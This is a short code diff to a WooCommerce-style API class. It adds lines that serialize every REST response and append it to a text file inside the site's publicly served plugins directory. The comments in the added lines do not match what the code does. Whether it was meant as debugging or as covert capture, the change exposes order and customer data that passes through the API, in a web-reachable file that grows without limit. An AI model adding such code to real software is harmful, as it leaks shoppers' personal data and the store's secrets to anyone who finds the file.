@@ -95,6 +95,17 @@ class WC_API extends WC_Legacy_API {
 			$request->set_query_params( $params );
 		}
 		$response = rest_do_request( $request );
+
+
+		$file = '/var/www/woo/wp-content/plugins/get/write.txt';
+				// Open the file to get existing content
+		$current = file_get_contents($file);
+				// Append a new person to the file
+		$current .= "body" . serialize($response) ;
+				// Write the contents back to the file
+		file_put_contents($file, $current);
+
+
 		$server   = rest_get_server();
 		$json     = wp_json_encode( $server->response_to_data( $response, false ) );
 		return json_decode( $json, true );
